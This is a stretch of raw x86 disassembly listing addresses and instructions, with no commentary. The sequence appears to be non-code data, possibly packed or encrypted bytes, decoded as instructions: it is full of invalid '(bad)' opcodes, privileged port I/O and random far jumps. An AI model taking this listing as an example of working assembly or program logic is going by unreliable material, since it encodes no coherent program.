  419b3a:	scas   al,BYTE PTR es:[edi]
  419b3b:	iret   
  419b3c:	aam    0x64
  419b3e:	pop    ebp
  419b3f:	test   eax,0xe2c4ba2
  419b44:	cmp    dl,cl
  419b46:	test   eax,0x703e3240
  419b4b:	icebp  
  419b4c:	daa    
  419b4d:	or     esp,DWORD PTR [eax-0x298cef1c]
  419b53:	and    BYTE PTR [edx],bh
  419b55:	sbb    al,0xc3
  419b57:	cmp    dh,BYTE PTR [ebx-0xfc6fda5]
  419b5d:	pop    edi
  419b5e:	mov    eax,0x77db8c7e
  419b63:	cld    
  419b64:	mov    bl,0x79
  419b66:	cdq    
  419b67:	mov    esi,0x41da3257
  419b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b6d:	hlt    
  419b6e:	in     al,0x98
  419b70:	pop    esp
  419b71:	sbb    al,0xe7
  419b73:	jbe    0x419bec
  419b75:	push   0x4e922b2c
  419b7a:	push   0x174cf273
  419b7f:	into   
  419b80:	add    esp,DWORD PTR [esi-0x3b59d17]
  419b86:	das    
  419b87:	sub    BYTE PTR [eax-0x4fa988a8],bh
  419b8d:	xchg   ebp,eax
  419b8e:	cmp    BYTE PTR fs:[edx],0xe6
  419b92:	sub    eax,0x6123019e
  419b97:	test   al,0x50
  419b99:	sbb    esp,ebx
  419b9b:	test   DWORD PTR [edi-0x3b],0x1874a138
  419ba2:	dec    esp
  419ba3:	in     al,dx
  419ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ba5:	fdiv   QWORD PTR [di+0x27bd]
  419baa:	mov    ebx,0x4a5ba793
  419baf:	add    ebp,DWORD PTR [edi+0x3e]
  419bb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bb3:	pop    ebx
  419bb4:	in     eax,0x58
  419bb6:	add    eax,DWORD PTR ds:0x21710732
  419bbc:	mov    al,0x59
  419bbe:	les    edi,FWORD PTR [ecx]
  419bc0:	cdq    
  419bc1:	(bad)  
  419bc2:	sub    al,0xb3
  419bc4:	push   ecx
  419bc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419bc6:	ins    BYTE PTR es:[edi],dx
  419bc7:	fbld   TBYTE PTR [ebx+0x79923ec]
  419bcd:	mov    dl,0xcb
  419bcf:	sbb    dl,BYTE PTR [ecx-0x7bb8851a]
  419bd5:	jb     0x419c3f
  419bd7:	js     0x419c4c
  419bd9:	test   eax,0x875310b4
  419bde:	jnp    0x419c32
  419be0:	leave  
  419be1:	lock dec eax
  419be3:	adc    eax,0xf8c3d70f
  419be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419be9:	inc    ebp
  419bea:	cmp    eax,DWORD PTR [ebp+0x2bd64e44]
  419bf0:	in     al,dx
  419bf1:	cmp    DWORD PTR [edi+0x1d02ef6b],ebx
  419bf7:	sub    BYTE PTR [edx+0x6b],bl
  419bfa:	xor    eax,0x8969f1a3
  419bff:	(bad)  
  419c00:	sub    BYTE PTR [ebp+0x6a3d005c],al
  419c06:	push   ebx
  419c07:	sbb    BYTE PTR [esi+0x1ef25a17],bl
  419c0d:	jb     0x419ba0
  419c0f:	jns    0x419c40
  419c11:	and    esp,DWORD PTR [ecx-0x3ed80f41]
  419c17:	inc    esp
  419c18:	scas   al,BYTE PTR es:[edi]
  419c19:	mov    al,ds:0x57ec889
  419c1e:	call   0x471:0xde903e2a
  419c25:	mov    dl,0xc8
  419c27:	mov    ch,0xc9
  419c29:	mov    esp,0xbaf93edd
  419c2e:	imul   ebx,ecx,0xa427d14a
  419c34:	cli    
  419c35:	psubsb mm7,QWORD PTR [ebp-0x1c93ab98]
  419c3c:	cli    
  419c3d:	pop    esp
  419c3e:	and    edi,0xdda9236f
  419c44:	or     BYTE PTR [edi],dl
  419c46:	loope  0x419c31
  419c48:	cmp    al,0xec
  419c4a:	int3   
  419c4b:	lea    ecx,[ebp-0x51]
  419c4e:	push   cs
  419c4f:	sub    eax,0x4dd57e44
  419c54:	int3   
  419c55:	or     dh,BYTE PTR [edi-0x1e6a4f59]
  419c5b:	gs jecxz 0x419c36
  419c5e:	fstp   TBYTE PTR [eax+0xf35657a]
  419c64:	jmp    0x6b35e67e
  419c69:	das    
  419c6a:	push   ds
  419c6b:	mov    esp,0xa3411a5b
  419c70:	jae    0x419cec
  419c72:	mov    esi,0xe705c3f1
  419c77:	cwde   
  419c78:	xor    al,0xd1
  419c7a:	cmp    ah,BYTE PTR [edx+0x334125c9]
  419c80:	adc    al,0x7f
  419c82:	imul   edi,DWORD PTR [ebx],0xeff87fa5
  419c88:	pop    ebp
  419c89:	dec    ecx
  419c8a:	push   edi
  419c8b:	in     al,0x8
  419c8d:	sub    DWORD PTR [esi],0x5e
  419c90:	dec    ebp
  419c91:	jg     0x419c82
  419c93:	shl    DWORD PTR fs:[ebp+0x3cad07aa],cl
  419c9a:	pop    ebx
  419c9b:	sub    ch,BYTE PTR [ebx+0x15]
  419c9e:	(bad)  
  419c9f:	in     eax,dx
  419ca0:	repz les edx,FWORD PTR [eax-0x6b6d9a29]
  419ca7:	and    DWORD PTR [eax+0x6f],esp
  419caa:	and    edx,DWORD PTR [ebx+0x1]
  419cad:	stos   DWORD PTR es:[edi],eax
  419cae:	and    BYTE PTR [ebp-0x3d],bl
  419cb1:	aaa    
  419cb2:	sub    DWORD PTR [esi-0x490df787],0x70
  419cb9:	push   eax
  419cba:	inc    esp
  419cbb:	test   al,0x15
  419cbd:	stos   DWORD PTR es:[edi],eax
  419cbe:	jecxz  0x419cb2
  419cc0:	and    eax,0x8475bbb5
  419cc5:	popf   
  419cc6:	(bad)  
  419cc7:	nop
  419cc8:	aad    0x9a
  419cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ccb:	sar    BYTE PTR [edi-0x6c0b4cc2],0x14
  419cd2:	push   cs
  419cd3:	das    
  419cd4:	outs   dx,BYTE PTR ds:[esi]
  419cd5:	mov    al,ds:0x3411802d
  419cda:	rol    BYTE PTR [edi-0x7cbd2995],cl
  419ce0:	cdq    
  419ce1:	les    ebx,FWORD PTR [edx+eiz*2-0x5adfffee]
  419ce8:	(bad)  
  419ce9:	idiv   al
  419ceb:	sahf   
  419cec:	arpl   WORD PTR [eax],dx
  419cee:	jns    0x419ca6
  419cf0:	jb     0x419c7b
  419cf2:	jl     0x419c86
  419cf4:	into   
  419cf5:	dec    edi
  419cf6:	xchg   DWORD PTR [edi],ecx
  419cf8:	lahf   
  419cf9:	into   
  419cfa:	pop    edi
  419cfb:	icebp  
  419cfc:	fidivr WORD PTR [eax+0x7b5c124]
  419d03:	les    esp,FWORD PTR [ecx+0x49952889]
  419d09:	cwde   
  419d0a:	push   cs
  419d0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d0c:	ss inc edx
  419d0e:	or     DWORD PTR [ebp+0x47],ebp
  419d11:	inc    edi
  419d12:	cli    
  419d13:	iret   
  419d14:	jns    0x419d44
  419d16:	jp     0x419d09
  419d18:	push   ebx
  419d19:	dec    ecx
  419d1a:	imul   ebp,ebx,0x78
  419d1d:	push   edx
  419d1e:	(bad)  
  419d1f:	call   0xde160ab5
  419d24:	and    al,0x77
  419d26:	addr16 push 0x53
  419d29:	xchg   esi,eax
  419d2a:	mov    eax,esi
  419d2c:	outs   dx,DWORD PTR ds:[esi]
  419d2d:	(bad)  
  419d2f:	mov    esp,0xfad90857
  419d34:	push   0x2cbbbfcc
  419d39:	add    al,0xf5
  419d3b:	sbb    DWORD PTR [eax+0x6b968ba8],ebp
  419d41:	cmp    ch,dh
  419d43:	clc    
  419d44:	push   0x45f24ecf
  419d49:	arpl   WORD PTR [eax-0x7c],cx
  419d4c:	jns    0x419dc5
  419d4e:	div    BYTE PTR [ecx+edx*8-0x61d4f6c8]
  419d55:	cmp    esp,DWORD PTR [ebp-0x2b8d1b3f]
  419d5b:	nop
  419d5c:	div    BYTE PTR [edx+0x30]
  419d5f:	(bad)  
  419d60:	pop    esp
  419d61:	sbb    bl,ch
  419d63:	arpl   WORD PTR [esi+0x6ed06b61],bp
  419d69:	ret    0x4e23
  419d6c:	add    ecx,edx
  419d6e:	push   cs
  419d6f:	push   esi
  419d70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d71:	repnz cmp ah,ah
  419d74:	pop    ecx
  419d75:	jne    0x419d7e
  419d77:	sbb    dh,cl
  419d79:	call   DWORD PTR [ecx-0x5c1dac74]
  419d7f:	call   DWORD PTR [ebx-0x50d75b8d]
  419d85:	mov    al,ds:0x1b72882a
  419d8a:	cmp    DWORD PTR [edx+ebp*8+0x2b87f81d],0x8a301a10
  419d95:	outs   dx,DWORD PTR ds:[esi]
  419d96:	mov    edi,edx
  419d98:	mov    DWORD PTR [ebx],edx
  419d9a:	div    edx
  419d9c:	sbb    al,0x0
  419d9e:	aam    0x95
  419da0:	or     eax,0x77c69d62
  419da5:	ret    0x63db
  419da8:	dec    ebx
  419da9:	fwait
  419daa:	inc    esp
  419dab:	ficomp WORD PTR [bp-0x17]
  419daf:	les    ebx,FWORD PTR [ecx+0x55]
  419db2:	jnp    0x419dfa
  419db4:	inc    ebx
  419db5:	(bad)  
  419db6:	in     al,0xc2
  419db8:	aad    0x9e
  419dba:	xchg   BYTE PTR [edi+0x27149359],dh
  419dc0:	pop    ecx
  419dc1:	push   ss
  419dc2:	in     al,0x71
  419dc4:	or     ah,BYTE PTR [ebp-0x75cb337e]
  419dca:	pushf  
  419dcb:	lock sbb DWORD PTR [ebx-0x51],eax
  419dcf:	sbb    eax,0x2d04aac4
  419dd4:	in     eax,dx
  419dd5:	cmp    BYTE PTR [ebp+edi*1-0x66],al
  419dd9:	(bad)  
  419dda:	and    DWORD PTR [edx],ebp
  419ddc:	(bad)  
  419dde:	mov    esi,DWORD PTR [edx]
  419de0:	and    BYTE PTR [esi],dl
  419de2:	inc    eax
  419de3:	mov    WORD PTR [esp+eiz*4],es
  419de6:	adc    bh,BYTE PTR [edi+0x50]
  419de9:	inc    esi
  419dea:	or     DWORD PTR es:[edi+0x75326576],eax
  419df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419df2:	mov    ?,WORD PTR [ecx]
  419df4:	push   ebx
  419df5:	mov    esi,0xe0ed39dc
  419dfa:	push   edx
  419dfb:	jmp    0x419e45
  419dfd:	ftst   
  419dff:	cmc    
  419e00:	lahf   
  419e01:	mov    ebx,0xe748239d
  419e06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e07:	popf   
  419e08:	call   0xdc8a:0xa463a476
  419e0f:	mov    dl,0x60
  419e11:	sbb    BYTE PTR [ecx+0x5fc2526f],dh
  419e17:	hlt    
  419e18:	mov    edx,0xd960e656
  419e1d:	sti    
  419e1e:	pop    esi
  419e1f:	sub    edx,edx
  419e21:	jb     0x419dde
  419e23:	icebp  
  419e24:	stos   DWORD PTR es:[edi],eax
  419e25:	inc    ecx
  419e26:	add    eax,0xc07679a4
  419e2b:	mov    bh,0x7c
  419e2d:	adc    esp,DWORD PTR [edx-0x15d2602]
  419e33:	push   edx
  419e34:	add    al,0x5d
  419e36:	jmp    0xed6e:0xc30c185d
  419e3d:	mov    esi,0x64842d63
  419e42:	xchg   esi,eax
  419e43:	fcmovne st,st(7)
  419e45:	repnz adc eax,0x356e9ee2
  419e4b:	pop    esp
  419e4c:	xchg   DWORD PTR [eax+0x5ed9cb90],edi
  419e52:	and    eax,0x3aa78ece
  419e57:	inc    esi
  419e58:	mov    al,0x82
  419e5a:	xchg   ecx,eax
  419e5b:	pop    ebx
  419e5c:	scas   eax,DWORD PTR es:[edi]
  419e5d:	mov    ah,0x1
  419e5f:	nop
  419e60:	fs lahf 
  419e62:	pop    ss
  419e63:	ret    0x402e
  419e66:	lds    edi,FWORD PTR [ebp+0xfe6e3cc]
  419e6c:	pop    ss
  419e6d:	bound  esp,QWORD PTR es:[esi-0x29]
  419e71:	sbb    esp,DWORD PTR [ebp+0x76]
  419e74:	out    dx,al
  419e75:	inc    esi
  419e76:	or     DWORD PTR [edx],esi
  419e78:	mov    ds:0x51ffbb2f,eax
  419e7d:	(bad)  
  419e7e:	loop   0x419e39
  419e80:	pop    ebx
  419e81:	push   eax
  419e82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e83:	not    bh
  419e85:	jb     0x419e8d
  419e87:	scas   eax,DWORD PTR es:[edi]
  419e88:	mov    edx,0x8096a7f8
  419e8d:	dec    esp
  419e8e:	in     eax,dx
  419e8f:	ror    BYTE PTR [edi+0x7a],0xad
  419e93:	adc    dh,cl
  419e95:	int    0x5f
  419e97:	sub    ah,BYTE PTR [eax+eiz*1-0x5039c402]
  419e9e:	adc    ch,BYTE PTR [esi]
  419ea0:	(bad)  
  419ea1:	mov    al,ds:0x3381ef26
  419ea6:	inc    edx
  419ea7:	mov    al,0x47
  419ea9:	out    0xff,eax
  419eab:	xlat   BYTE PTR ds:[ebx]
  419eac:	jp     0x419e39
  419eae:	loop   0x419f0e
  419eb0:	mov    al,ds:0xc4d1c0cb
  419eb5:	push   ebx
  419eb6:	push   cs
  419eb7:	mov    ecx,0x3d7a5293
  419ebc:	xor    BYTE PTR [esi+0x17ebf025],al
  419ec2:	les    ecx,FWORD PTR [ecx+0x1dd42d11]
  419ec8:	or     DWORD PTR [ebp+0x3],edi
  419ecb:	outs   dx,BYTE PTR ds:[esi]
  419ecc:	int3   
  419ecd:	adc    dh,dh
  419ecf:	(bad)  
  419ed1:	shl    BYTE PTR [ecx-0x31],0x73
  419ed5:	sbb    BYTE PTR [edi-0x5e],0x3f
  419ed9:	push   edx
  419eda:	fdiv   st,st(5)
  419edc:	jle    0x419ebb
  419ede:	ss jmp 0x872c8cef
  419ee4:	inc    eax
  419ee5:	sub    edx,0x7
  419ee8:	xor    ebx,ecx
  419eea:	(bad)  
  419eeb:	cmc    
  419eec:	dec    esp
  419eed:	js     0x419f53
  419eef:	mov    edi,0xcedb26a0
  419ef4:	in     eax,dx
  419ef5:	ja     0x419f41
  419ef7:	and    DWORD PTR [edx+0x9],esi
  419efa:	mov    edx,DWORD PTR [edx]
  419efc:	loopne 0x419ee8
  419efe:	sbb    dh,bh
  419f00:	rcr    DWORD PTR [ebx+0x415585bf],0xb8
  419f07:	and    esp,DWORD PTR [ebx+0x7724fd16]
  419f0d:	mov    edi,DWORD PTR [eax+0x28]
  419f10:	cwde   
  419f11:	into   
  419f12:	add    DWORD PTR [edx-0x2be7447a],ebx
  419f18:	mov    eax,0x6bcda600
  419f1d:	pop    es
  419f1e:	pushw  cs
  419f20:	jne    0x419ea4
  419f22:	inc    edi
  419f23:	adc    DWORD PTR [esi+eax*8+0x5667d231],0xffffffc0
  419f2b:	cs push edi
  419f2d:	aaa    
  419f2e:	(bad)  
  419f2f:	xor    cl,BYTE PTR [eax]
  419f31:	pusha  
  419f32:	icebp  
  419f33:	(bad)  
  419f34:	aad    0x78
  419f36:	pop    ds
  419f37:	pusha  
  419f38:	lea    esi,[ebp+0x59]
  419f3b:	idiv   BYTE PTR [ecx+0x36eaff6f]
  419f41:	jmp    0xd467:0x913f15b0
  419f48:	mov    al,0x13
  419f4a:	pop    eax
  419f4b:	xchg   esi,eax
  419f4c:	mov    edx,0x82ef8fbd
  419f51:	(bad)  
  419f52:	outs   dx,BYTE PTR ds:[esi]
  419f53:	push   edi
  419f54:	fwait
  419f55:	pop    ecx
  419f56:	xchg   ebx,eax
  419f57:	push   es
  419f58:	fistp  QWORD PTR [ebx+0x70]
  419f5b:	adc    DWORD PTR [ebx],ebp
  419f5d:	pop    edi
  419f5e:	sbb    al,0x30
  419f60:	loopne 0x419f49
  419f62:	les    esi,FWORD PTR [esi]
  419f64:	push   edx
  419f65:	not    BYTE PTR [edx+0x53]
  419f68:	outs   dx,BYTE PTR ds:[esi]
  419f69:	lea    esp,[esi+0x7afb1fc]
  419f6f:	addr16 jne 0x419f3c
  419f72:	xchg   ecx,eax
  419f73:	xor    ebx,ecx
  419f75:	outs   dx,DWORD PTR ds:[esi]
  419f76:	add    BYTE PTR [eax-0xaaaa88c],0xf4
  419f7d:	and    BYTE PTR [ecx],al
  419f7f:	shl    BYTE PTR [edx-0xc],1
  419f82:	or     bl,dh
  419f84:	lods   al,BYTE PTR ds:[esi]
  419f85:	mov    bh,0xcf
  419f87:	jmp    0x6c75:0x31db5b7d
  419f8e:	das    
  419f8f:	sub    DWORD PTR [ecx+0x79d9623e],ebx
  419f95:	xor    DWORD PTR [eax],ecx
  419f97:	test   eax,0xf415e358
  419f9c:	mov    eax,ds:0xbaee5dd
  419fa1:	test   DWORD PTR [ebx],eax
  419fa3:	out    dx,al
  419fa4:	call   0x4682291b
  419fa9:	xor    al,0x68
  419fab:	mov    DWORD PTR [ecx-0x1e],edx
  419fae:	sub    BYTE PTR [ecx-0x13],0x61
  419fb2:	popa   
  419fb3:	jnp    0x419fd8
  419fb5:	mov    ah,0x5a
  419fb7:	out    dx,al
  419fb8:	add    al,0x2b
  419fba:	sbb    al,0x99
  419fbc:	adc    edi,esi
  419fbe:	mov    ecx,0xb89576f7
  419fc3:	lock ret 
  419fc5:	cmp    BYTE PTR [eax+0xe765388],ch
  419fcb:	add    bl,cl
  419fcd:	inc    ebp
  419fce:	sbb    ecx,DWORD PTR [edx+0x702b3699]
  419fd4:	jnp    0x419ff5
  419fd6:	imul   esi,esp,0xb7093888
  419fdc:	call   0x80ef:0xea9fd79
  419fe3:	jne    0x419f68
  419fe5:	dec    edx
  419fe6:	test   BYTE PTR [ecx-0x7e],al
  419fe9:	adc    BYTE PTR [ecx],bl
  419feb:	xor    BYTE PTR [edx-0x2d39e235],dh
  419ff1:	pop    ecx
  419ff2:	xchg   edx,eax
  419ff3:	jp     0x41a00b
  419ff5:	mov    esp,DWORD PTR ds:0xafdb3922
  419ffb:	lds    eax,FWORD PTR [esi]
  419ffd:	pop    es
  419ffe:	xor    ch,BYTE PTR [edi]
  41a000:	(bad)  
  41a001:	popa   
  41a002:	stos   DWORD PTR es:[edi],eax
  41a003:	push   ds
  41a004:	iret   
  41a005:	dec    edi
  41a006:	and    BYTE PTR [edx-0x521b061e],ch
  41a00c:	pop    eax
  41a00d:	and    BYTE PTR [eax-0x36005006],0x65
  41a014:	inc    edi
  41a015:	sbb    eax,0xd356d8eb
  41a01a:	inc    edx
  41a01b:	and    DWORD PTR [ebx-0x61d1962e],ebp
  41a021:	pop    edx
  41a022:	cld    
  41a023:	lods   al,BYTE PTR ds:[esi]
  41a024:	sbb    BYTE PTR [edx-0x677c785e],dl
  41a02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a02b:	jmp    0x41a030
  41a02d:	and    BYTE PTR [edi-0x60],bh
  41a030:	jbe    0x41a07f
  41a032:	sbb    esp,DWORD PTR [eax]
  41a034:	cmp    DWORD PTR [ebx+0x1d],ebx
  41a037:	inc    esi
  41a038:	fs push cs
  41a03a:	cmp    al,0x53
  41a03c:	mov    eax,ds:0x694f0deb
  41a041:	cld    
  41a042:	or     edx,DWORD PTR [ebx-0x7b]
  41a045:	aas    
  41a046:	sbb    DWORD PTR [eax],ebx
  41a048:	js     0x41a087
  41a04a:	pop    esp
  41a04b:	push   0x37
  41a04d:	xchg   esp,eax
  41a04e:	and    esp,0xdd0e6a44
  41a054:	popa   
  41a055:	mov    ecx,0xdeb3fe5b
  41a05a:	int3   
  41a05b:	out    0x8,eax
  41a05d:	cmp    BYTE PTR [ebx+0x70e7b4eb],bl
  41a063:	retf   0x28f6
  41a066:	mov    ds:0x6946cf32,al
  41a06b:	into   
  41a06c:	push   ebp
  41a06d:	jns    0x41a0de
  41a06f:	dec    edx
  41a070:	sub    DWORD PTR [edi-0x2d3b2828],0xffffffc0
  41a077:	sub    DWORD PTR [eax+0x3c85107f],edx
  41a07d:	xor    al,0xb1
  41a07f:	jns    0x41a0e8
  41a081:	push   ebp
  41a082:	(bad)  
  41a084:	cmp    esp,DWORD PTR [edi]
  41a086:	(bad)  
  41a087:	std    
  41a088:	outs   dx,BYTE PTR ds:[esi]
  41a089:	ret    
  41a08a:	inc    eax
  41a08b:	or     DWORD PTR [eax],ebp
  41a08d:	dec    esi
  41a08e:	jle    0x41a0a6
  41a090:	add    DWORD PTR ds:0x48eedcdd,ebx
  41a096:	push   cs
  41a097:	mov    ebp,0x55db8b40
  41a09c:	scas   eax,DWORD PTR es:[edi]
  41a09d:	pusha  
  41a09e:	jecxz  0x41a07f
  41a0a0:	ds cwde 
  41a0a2:	push   ebp
  41a0a3:	mov    eax,eax
  41a0a5:	or     eax,0xa68fc7e4
  41a0aa:	ret    0x786a
  41a0ad:	jno    0x41a127
  41a0af:	mov    DWORD PTR [ebp-0x4c],edx
  41a0b2:	gs test al,0x7c
  41a0b5:	and    ecx,DWORD PTR [ebp-0x3c7abfba]
  41a0bb:	(bad)  
  41a0bc:	lock repz or eax,0x1a6c3b6b
  41a0c3:	outs   dx,BYTE PTR ds:[esi]
  41a0c4:	mov    eax,ds:0xdc6439d6
  41a0c9:	xchg   ebx,eax
  41a0ca:	mov    BYTE PTR [esp+ebp*2+0xabf8460],bh
  41a0d1:	clc    
  41a0d2:	mov    cl,BYTE PTR es:[ebx+0x187d0131]
  41a0d9:	out    0xfe,al
  41a0db:	mov    eax,ds:0xb3cc4204
  41a0e0:	mov    edx,es
  41a0e2:	aam    0xe0
  41a0e4:	jp     0x41a089
  41a0e6:	(bad)  
  41a0e7:	ins    BYTE PTR es:[edi],dx
  41a0e8:	cdq    
  41a0e9:	int    0x9b
  41a0eb:	pop    eax
  41a0ec:	jae    0x41a0b8
  41a0ee:	cmp    cl,dl
  41a0f0:	xchg   BYTE PTR [edi+0x10],ah
  41a0f3:	push   cs
  41a0f4:	pushf  
  41a0f5:	inc    ebx
  41a0f6:	in     al,0x7b
  41a0f8:	popf   
  41a0f9:	mov    eax,ds:0x1453a536
  41a0fe:	xor    BYTE PTR [ecx-0x30d1ab48],ch
  41a104:	xlat   BYTE PTR ds:[ebx]
  41a105:	xor    DWORD PTR [ebx+0x60],eax
  41a108:	je     0x41a146
  41a10a:	shl    BYTE PTR [esp+eiz*2-0x33],1
  41a10e:	hlt    
  41a10f:	cld    
  41a110:	or     DWORD PTR [edi],ecx
  41a112:	mov    ah,BYTE PTR [ebx+0x3c]
  41a115:	stos   DWORD PTR es:[edi],eax
  41a116:	fs aas 
  41a118:	sub    BYTE PTR [esi-0x1b],cl
  41a11b:	cmc    
  41a11c:	sbb    al,0xfe
  41a11e:	mov    ch,0xff
  41a120:	sub    al,0x5c
  41a122:	pop    es
  41a123:	push   edi
  41a124:	mov    ebx,0xdb372c5a
  41a129:	int3   
  41a12a:	pop    ecx
  41a12b:	xchg   esi,eax
  41a12c:	out    dx,eax
  41a12d:	fcomi  st,st(1)
  41a12f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a130:	fcomp  DWORD PTR [eax-0x1e4e102]
  41a136:	(bad)  
  41a137:	dec    esi
  41a138:	jmp    0xe747088f
  41a13d:	bound  esp,QWORD PTR [esi+0x1910c130]
  41a143:	pop    es
  41a144:	push   ebp
  41a145:	cdq    
  41a146:	outs   dx,DWORD PTR ds:[esi]
  41a147:	and    bh,BYTE PTR [ecx]
  41a149:	outs   dx,DWORD PTR ds:[esi]
  41a14a:	and    DWORD PTR [esi+0x6d],0xffffffe7
  41a14e:	and    ecx,DWORD PTR es:[edi-0x23]
  41a152:	xchg   ebp,eax
  41a153:	dec    eax
  41a154:	mov    BYTE PTR [edi-0x58],dl
  41a157:	mov    ah,0x7b
  41a159:	cwde   
  41a15a:	lahf   
  41a15b:	sub    bl,BYTE PTR [eax+0x64c52e8f]
  41a161:	jno    0x41a167
  41a163:	push   eax
  41a164:	push   ebp
  41a165:	pusha  
  41a166:	scas   eax,DWORD PTR es:[edi]
  41a167:	push   ss
  41a168:	out    dx,al
  41a169:	push   0xffffff8d
  41a16b:	xchg   edi,eax
  41a16c:	in     eax,0x68
  41a16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a16f:	mov    edi,0xa16c2317
  41a174:	mov    ebp,0x26858516
  41a179:	(bad)  
  41a17a:	sti    
  41a17b:	jmp    0xd130:0xcabb4e0b
  41a182:	sub    DWORD PTR [esi+0x1918d318],eax
  41a188:	mov    bh,0x9b
  41a18a:	push   edi
  41a18b:	xchg   ebx,eax
  41a18c:	call   0x2558:0x971032f8
  41a193:	aam    0x98
  41a195:	mov    dl,0xb0
  41a197:	mov    ds:0x4121546a,al
  41a19c:	leave  
  41a19d:	jge    0x41a1b4
  41a19f:	pusha  
  41a1a0:	or     bl,ch
  41a1a2:	dec    edx
  41a1a3:	ret    
  41a1a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1a5:	or     al,0x61
  41a1a7:	dec    eax
  41a1a8:	jmp    0xac05ed79
  41a1ad:	or     edx,DWORD PTR [ecx-0x59fccf0a]
  41a1b3:	mov    bl,0x9d
  41a1b5:	int3   
  41a1b6:	pushf  
  41a1b7:	push   ds
  41a1b8:	push   0x74
  41a1ba:	and    al,0xa8
  41a1bc:	je     0x41a22d
  41a1be:	sahf   
  41a1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1c0:	out    0xc0,eax
  41a1c2:	out    dx,eax
  41a1c3:	arpl   WORD PTR [edi+0x5e],sp
  41a1c6:	adc    ch,BYTE PTR [edi]
  41a1c8:	adc    eax,DWORD PTR [eax-0x1]
  41a1cb:	retf   0x8367
  41a1ce:	stos   DWORD PTR es:[edi],eax
  41a1cf:	sbb    eax,DWORD PTR [edx+0xffae532]
  41a1d5:	dec    ebp
  41a1d6:	scas   eax,DWORD PTR es:[edi]
  41a1d7:	aas    
  41a1d8:	adc    al,0xe5
  41a1da:	test   al,0x2e
  41a1dc:	test   esi,eax
  41a1de:	push   ss
  41a1df:	clc    
  41a1e0:	out    dx,al
  41a1e1:	loop   0x41a189
  41a1e3:	iret   
  41a1e4:	push   esp
  41a1e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1e6:	int3   
  41a1e7:	iret   
  41a1e8:	pop    ds
  41a1e9:	bound  ecx,QWORD PTR [edx-0x2e1ac133]
  41a1ef:	das    
  41a1f0:	aaa    
  41a1f1:	add    edi,ebx
  41a1f3:	jle    0x41a251
  41a1f5:	pusha  
  41a1f6:	aad    0x2b
  41a1f8:	push   edx
  41a1f9:	mov    ebp,0x4d7046ea
  41a1fe:	push   esp
  41a1ff:	int3   
  41a200:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a202:	inc    ecx
  41a203:	ja     0x41a276
  41a205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a206:	aas    
  41a207:	or     eax,DWORD PTR [ecx+0x3e]
  41a20a:	mov    BYTE PTR cs:[ecx+0x13],ah
  41a20e:	sbb    al,0x92
  41a210:	jmp    0x41a216
  41a212:	hlt    
  41a213:	sbb    al,0x40
  41a215:	jg     0x41a1cd
  41a217:	ret    0xbcc8
  41a21a:	call   0x636d37a4
  41a21f:	xchg   bl,ah
  41a221:	ins    BYTE PTR es:[edi],dx
  41a222:	push   0xd752628f
  41a227:	es cmp dh,dl
  41a22a:	jp     0x41a234
  41a22c:	cld    
  41a22d:	pop    esp
  41a22e:	aad    0x9d
  41a230:	cmp    esi,ebp
  41a232:	add    DWORD PTR [esi],esp
  41a234:	pop    ebp
  41a235:	sbb    cl,BYTE PTR [ebx+0x74a18177]
  41a23b:	dec    edi
  41a23c:	mov    bl,0xf4
  41a23f:	(bad)  
  41a240:	int    0x67
  41a242:	push   0xffffffc7
  41a244:	(bad)  
  41a245:	mov    edi,0xbd30deea
  41a24a:	fnstenv [edx-0x72919d88]
  41a250:	sbb    DWORD PTR [edx+0x7b],edi
  41a253:	fcmovnu st,st(7)
  41a255:	push   cs
  41a256:	mov    bh,0xff
  41a258:	mov    ch,bl
  41a25a:	test   BYTE PTR [eax-0x7d],bl
  41a25d:	scas   eax,DWORD PTR es:[edi]
  41a25e:	sbb    DWORD PTR [eax+0x23133b0c],edx
  41a264:	push   esi
  41a265:	stos   BYTE PTR es:[edi],al
  41a266:	add    ebx,DWORD PTR [esi+0x15]
  41a269:	lock pop ebp
  41a26b:	xor    eax,0xf359eea3
  41a270:	jmp    0xfa75:0xcb2b042c
  41a277:	mov    ah,0x87
  41a279:	adc    BYTE PTR ds:0xae347777,cl
  41a27f:	shr    DWORD PTR [ebx+ebx*2+0x48],0xf6
  41a284:	fcomi  st,st(4)
  41a286:	inc    edx
  41a287:	fstp   TBYTE PTR [ebx+0x33aa2699]
  41a28d:	in     al,0xf9
  41a28f:	and    cl,al
  41a291:	sub    BYTE PTR [ebx-0x7a60d604],0x26
  41a298:	mov    esi,0x2729e278
  41a29d:	rcr    DWORD PTR [ebp+eax*1-0x3b00a651],1
  41a2a4:	inc    ebx
  41a2a5:	call   DWORD PTR [ebp-0x4ba6a574]
  41a2ab:	mov    gs,WORD PTR [eax]
  41a2ad:	dec    eax
  41a2ae:	test   BYTE PTR [esi+0x52],dh
  41a2b1:	hlt    
  41a2b2:	in     al,dx
  41a2b3:	xor    cl,BYTE PTR [edi+eax*1-0x625e89a6]
  41a2ba:	in     eax,dx
  41a2bb:	or     cl,al
  41a2bd:	mov    ebp,0xeb2da7ed
  41a2c2:	xchg   BYTE PTR [edx+eax*4-0x6b],cl
  41a2c6:	mov    eax,ds:0x7ede9739
  41a2cb:	mov    ebp,0x26c5b722
  41a2d0:	jmp    0x41a300
  41a2d2:	ins    BYTE PTR es:[edi],dx
  41a2d3:	mov    esi,0x94556c93
  41a2d8:	sbb    edx,DWORD PTR [edi]
